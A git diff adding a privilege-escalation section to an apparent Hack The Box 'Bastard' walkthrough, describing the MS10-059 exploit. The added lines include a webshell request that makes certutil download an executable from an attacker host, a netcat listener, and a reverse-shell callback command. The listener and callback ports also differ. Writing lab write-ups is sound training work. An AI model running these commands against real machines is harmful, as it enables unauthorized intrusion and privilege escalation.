@@ -84,10 +84,19 @@ The unserialize function can result in code being loaded and executed. </br>
 **Initial Shell Screenshot:** </br>
 ![initial_shell_poc2](images/bastard/initial_shell_poc2.png) </br>
 # Privilege Escalation:
-Just trying to write some text here </br>
+I used the [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) tool, and found out the machine was vulnerable to MS10-059. </br>
+I found an exploit on [GitHub](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059), I downloaded the ```exploit.exe``` file to my Kali machine, </br>
+and downloaded on the windows machine, using cerutil (I used the webshell from earlier): </br>
+```bash
+http://10.10.10.9/test.php?cmd=certutil%20-urlcache%20-split%20-f%20%22http://10.10.14.2/privesc.exe%22%20privesc.exe
+``` </br>
+I used netcat to listen to 1235 port on my Kali Linux: ```nc -nlvp 1235``` , and ran the exploit on the windows machine: ```privesc.exe 10.10.14.2 1234``` </br>
+[privesc_exploit](images/bastard/privesc_exploit.png) </br>
+[privesc_exploit2](images/bastard/privesc_exploit2.png) </br>
 
-
-
-
-
+**Vulnerability Explanation:** The Tracing Feature for Services has incorrect ACLs on its registry keys,
+which allows local users to gain privileges via vectors involving a named pipe and impersonation, aka
+"Tracing Registry Key ACL Vulnerability." </br>
+**Proof Of Screenshot:** </br>
+[privesc_poc](images/bastard/privesc_poc.png) </br>
 
